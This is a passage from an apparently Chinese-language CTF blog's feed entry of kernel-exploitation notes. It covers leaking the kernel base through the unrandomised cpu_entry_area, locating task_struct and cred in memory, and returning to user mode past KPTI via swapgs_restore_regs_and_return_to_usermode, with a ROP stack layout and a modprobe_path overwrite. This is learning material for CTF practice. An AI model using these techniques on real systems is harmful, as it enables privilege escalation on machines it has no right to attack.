proc near </span><br></pre></td></tr></table></figure><h2 id="cpu-entry-area-mapping"><a href="#cpu-entry-area-mapping" class="headerlink" title="cpu_entry_area mapping"></a>cpu_entry_area mapping</h2><p>在内核官方文档给出的虚拟内存布局中,有这么一个区域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fffffe0000000000 |   -2    TB | fffffe7fffffffff |  0.5 TB | cpu_entry_area mapping</span><br></pre></td></tr></table></figure><p>这里找到了一些相关的资料</p><blockquote><p><code>cpu_entry_area</code> contains all the data and code needed to allow the CPU to hand control over to the kernel. You can see its definition in <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/include/asm/cpu_entry_area.h"><code>arch/x86/include/asm/cpu_entry_area.h</code></a>: it contains</p><ul><li>the GDT;</li><li>the entry stack;</li><li>the TSS;</li><li>a set of trampolines;</li><li>the exception stacks;</li><li>debug stores and buffers.</li></ul><p>The trampolines contain the entry points for syscalls; see for example <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/entry/entry_64.S"><code>arch/x86/entry/entry_64.S</code></a> which defines the entry point for 64-bit calls.</p></blockquote><p>里面存储了一些cpu与内核之间需要共享的信息</p><p>对于kernel pwn来说我们只需要知道,这个区域存储着一些<code>.text</code>段的指针</p><p>并且最棒的是这个区域不参与地址随机化,所以这个区域完全可以用来泄露基址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xfffffe0000000004</span> <span class="number">20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0xfffffe0000000004</span> —▸ <span class="number">0xffffffff90e08e00</span> ◂— nop </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0xfffffe000000000c</span> ◂— <span class="number">0x10114000000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0xfffffe0000000014</span> —▸ <span class="number">0xffffffff90e08e03</span> ◂— nop </span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0xfffffe000000001c</span> ◂— <span class="number">0x10162000000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0xfffffe0000000024</span> —▸ <span class="number">0xffffffff90e08e02</span> ◂— nop </span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0xfffffe000000002c</span> ◂— <span class="number">0x1011a000000000</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0xfffffe0000000034</span> —▸ <span class="number">0xffffffff90e0ee00</span> ◂— nop </span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0xfffffe000000003c</span> ◂— <span class="number">0x100d0000000000</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0xfffffe0000000044</span> —▸ <span class="number">0xffffffff90e0ee00</span> ◂— nop </span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0xfffffe000000004c</span> ◂— <span class="number">0x100d3000000000</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0xfffffe0000000054</span> —▸ <span class="number">0xffffffff90e08e00</span> ◂— nop </span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0xfffffe000000005c</span> ◂— <span class="number">0x100d6000000000</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0xfffffe0000000064</span> —▸ <span class="number">0xffffffff90e08e00</span> ◂— nop </span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0xfffffe000000006c</span> ◂— <span class="number">0x100d9000000000</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0xfffffe0000000074</span> —▸ <span class="number">0xffffffff90e08e00</span> ◂— nop </span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0xfffffe000000007c</span> ◂— <span class="number">0x100dc000000000</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0xfffffe0000000084</span> —▸ <span class="number">0xffffffff90e08e01</span> ◂— nop </span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0xfffffe000000008c</span> ◂— <span class="number">0x100df000000000</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0xfffffe0000000094</span> —▸ <span class="number">0xffffffff90e08e00</span> ◂— nop </span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0xfffffe000000009c</span> ◂— <span class="number">0x100e2000000000</span></span><br></pre></td></tr></table></figure><h2 id="task-struct"><a href="#task-struct" class="headerlink" title="task_struct"></a>task_struct</h2><p>在Linux下，对于每一个进程，内核都会申请一块struct task_struct结构体来保存进程信息 由全局结构体init_task为链表头，<u>由struct list_head children双向循环链表链接其他进程的task_struct</u></p><p>特别要注意到，struct list_head children中的next指针指向的是下一个task_struct中<strong>children成员 + 0x10</strong>，而非task_struct头部或list_head的next指针</p><h2 id="内存搜索进程"><a href="#内存搜索进程" class="headerlink" title="内存搜索进程"></a>内存搜索进程</h2><p>当我们获得了搜索内存的能力之后,为了进一步的提权,就需要找到cred或者task_struct结构体</p><p>但是在茫茫二进制中如何找到这些数据是一个难题</p><p>但好在我们可以利用一些标志性的数据来判断是否命中</p><p>例如<code>prctl(PR_SET_NAME,&quot;new_process_name&quot;)</code>可以修改本进程<code>comm</code>字段的内容,而comm附近有存在cred指针</p><p>又或者利用<code>init_task</code>不停遍历所有的task_struct结构体,然后通过pid,canary,comm等确认结构体</p><p>对于init_task对应的pid 0进程而言，pid和t_pid均为0，stack_canary为低八位为0其他位不为0的8字节数，comm通常为”swapper/0″</p><h2 id="bypass-kpti"><a href="#bypass-kpti" class="headerlink" title="bypass_kpti"></a>bypass_kpti</h2><p>KPTI中每个进程有两套页表——内核态页表与用户态页表(两个地址空间)。内核态页表只能在内核态下访问，可以创建到内核和用户的映射（不过用户空间受SMAP和SMEP保护）。用户态页表只包含用户空间。不过由于涉及到上下文切换，所以在用户态页表中必须包含部分内核地址，用来建立到中断入口和出口的映射。</p><p>当中断在用户态发生时，就涉及到切换CR3寄存器，从用户态地址空间切换到内核态的地址空间。中断上半部的要求是尽可能的快，从而切换CR3这个操作也要求尽可能的快。为了达到这个目的，KPTI中将内核空间的PGD和用户空间的PGD连续的放置在一个8KB的内存空间中(<strong>内核态在低位，用户态在高位</strong>).<strong>这段空间必须是8K对齐的</strong>，这样将CR3的切换操作转换为将CR3值的第13位(由低到高)的置位或清零操作，提高了CR3切换的速度。</p><p>kernel pwn中需要用到的一般就是在提权后顺利返回到用户态</p><p>所以有一种方法就是利用swapgs_restore_regs_and_return_to_usermode这个函数返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms| grep swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">arch/x86/entry/entry_64.S</span><br><span class="line"></span><br><span class="line"><span class="title function_">SYM_INNER_LABEL</span><span class="params">(swapgs_restore_regs_and_return_to_usermode, SYM_L_GLOBAL)</span></span><br><span class="line"></span><br><span class="line">    POP_REGS pop_rdi=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.</span></span><br><span class="line"><span class="comment">     * Save old stack pointer and switch to trampoline stack.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    movq    %rsp, %rdi</span><br><span class="line">    movq    <span class="title function_">PER_CPU_VAR</span><span class="params">(cpu_tss_rw + TSS_sp0)</span>, %rsp</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Copy the IRET frame to the trampoline stack. */</span></span><br><span class="line">    pushq    6*8<span class="params">(%rdi)</span>    <span class="comment">/* SS */</span></span><br><span class="line">    pushq    5*8<span class="params">(%rdi)</span>    <span class="comment">/* RSP */</span></span><br><span class="line">    pushq    4*8<span class="params">(%rdi)</span>    <span class="comment">/* EFLAGS */</span></span><br><span class="line">    pushq    3*8<span class="params">(%rdi)</span>    <span class="comment">/* CS */</span></span><br><span class="line">    pushq    2*8<span class="params">(%rdi)</span>    <span class="comment">/* RIP */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Push user RDI on the trampoline stack. */</span></span><br><span class="line">    <span class="title function_">pushq</span>    <span class="params">(%rdi)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * We are on the trampoline stack.  All regs except RDI are live.</span></span><br><span class="line"><span class="comment">     * We can do future final exit work right here.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">    SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Restore RDI. */</span></span><br><span class="line">    popq    %rdi</span><br><span class="line">    SWAPGS</span><br><span class="line">    INTERRUPT_RETURN</span><br></pre></td></tr></table></figure><p>纯汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600A34 41 5F                          pop     r15</span><br><span class="line">.text:FFFFFFFF81600A36 41 5E                          pop     r14</span><br><span class="line">.text:FFFFFFFF81600A38 41 5D                          pop     r13</span><br><span class="line">.text:FFFFFFFF81600A3A 41 5C                          pop     r12</span><br><span class="line">.text:FFFFFFFF81600A3C 5D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF81600A3D 5B                             pop     rbx</span><br><span class="line">.text:FFFFFFFF81600A3E 41 5B                          pop     r11</span><br><span class="line">.text:FFFFFFFF81600A40 41 5A                          pop     r10</span><br><span class="line">.text:FFFFFFFF81600A42 41 59                          pop     r9</span><br><span class="line">.text:FFFFFFFF81600A44 41 58                          pop     r8</span><br><span class="line">.text:FFFFFFFF81600A46 58                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600A47 59                             pop     rcx</span><br><span class="line">.text:FFFFFFFF81600A48 5A                             pop     rdx</span><br><span class="line">.text:FFFFFFFF81600A49 5E                             pop     rsi</span><br><span class="line">.text:FFFFFFFF81600A4A 48 89 E7                       mov     rdi, rsp    &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class="line">.text:FFFFFFFF81600A4D 65 48 8B 24 25+                mov     rsp, gs: 0x5004</span><br><span class="line">.text:FFFFFFFF81600A56 FF 77 30                       push    qword ptr [rdi+30h]</span><br><span class="line">.text:FFFFFFFF81600A59 FF 77 28                       push    qword ptr [rdi+28h]</span><br><span class="line">.text:FFFFFFFF81600A5C FF 77 20                       push    qword ptr [rdi+20h]</span><br><span class="line">.text:FFFFFFFF81600A5F FF 77 18                       push    qword ptr [rdi+18h]</span><br><span class="line">.text:FFFFFFFF81600A62 FF 77 10                       push    qword ptr [rdi+10h]</span><br><span class="line">.text:FFFFFFFF81600A65 FF 37                          push    qword ptr [rdi]</span><br><span class="line">.text:FFFFFFFF81600A67 50                             push    rax</span><br><span class="line">.text:FFFFFFFF81600A68 EB 43                          nop</span><br><span class="line">.text:FFFFFFFF81600A6A 0F 20 DF                       mov     rdi, cr3</span><br><span class="line">.text:FFFFFFFF81600A6D EB 34                          jmp     0xFFFFFFFF81600AA3</span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600AA3 48 81 CF 00 10+                or      rdi, 1000h</span><br><span class="line">.text:FFFFFFFF81600AAA 0F 22 DF                       mov     cr3, rdi</span><br><span class="line">.text:FFFFFFFF81600AAD 58                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600AAE 5F                             pop     rdi</span><br><span class="line">.text:FFFFFFFF81600AAF FF 15 23 65 62+                call    cs: SWAPGS</span><br><span class="line">.text:FFFFFFFF81600AB5 FF 25 15 65 62+                jmp     cs: INTERRUPT_RETURN</span><br><span class="line"></span><br><span class="line">_SWAPGS</span><br><span class="line">.text:FFFFFFFF8103EFC0 55                             push    rbp</span><br><span class="line">.text:FFFFFFFF8103EFC1 48 89 E5                       mov     rbp, rsp</span><br><span class="line">.text:FFFFFFFF8103EFC4 0F 01 F8                       swapgs</span><br><span class="line">.text:FFFFFFFF8103EFC7 5D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF8103EFC8 C3                             retn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_INTERRUPT_RETURN</span><br><span class="line">.text:FFFFFFFF81600AE0 F6 44 24 20 04                 test    byte ptr [rsp+0x20], 4</span><br><span class="line">.text:FFFFFFFF81600AE5 75 02                          jnz     native_irq_return_ldt</span><br><span class="line">.text:FFFFFFFF81600AE7 48 CF                          iretq</span><br></pre></td></tr></table></figure><p>ROP时,程序流程控制到 mov rdi, rsp 指令时，栈布局如下就行：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rsp  ----&gt;  0</span><br><span class="line">            0</span><br><span class="line">            rip</span><br><span class="line">            cs</span><br><span class="line">            rflags</span><br><span class="line">            rsp</span><br><span class="line">            ss</span><br></pre></td></tr></table></figure><p>然后貌似不能够直接从mov rdi,cr3处开始(还没确认)</p><p>此外改modprobe_path也是一个不错的方法，返回后当前进程Segmentation fault也不影响提权</p>]]></content>
    
    
    <summary type="html">kernel好难,先做个十几二十题熟悉熟悉 (摆了,只做了不到十题_orz)</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="kernel" scheme="https://ixout.github.io/tags/kernel/"/>
    
  </entry>
  
</feed>
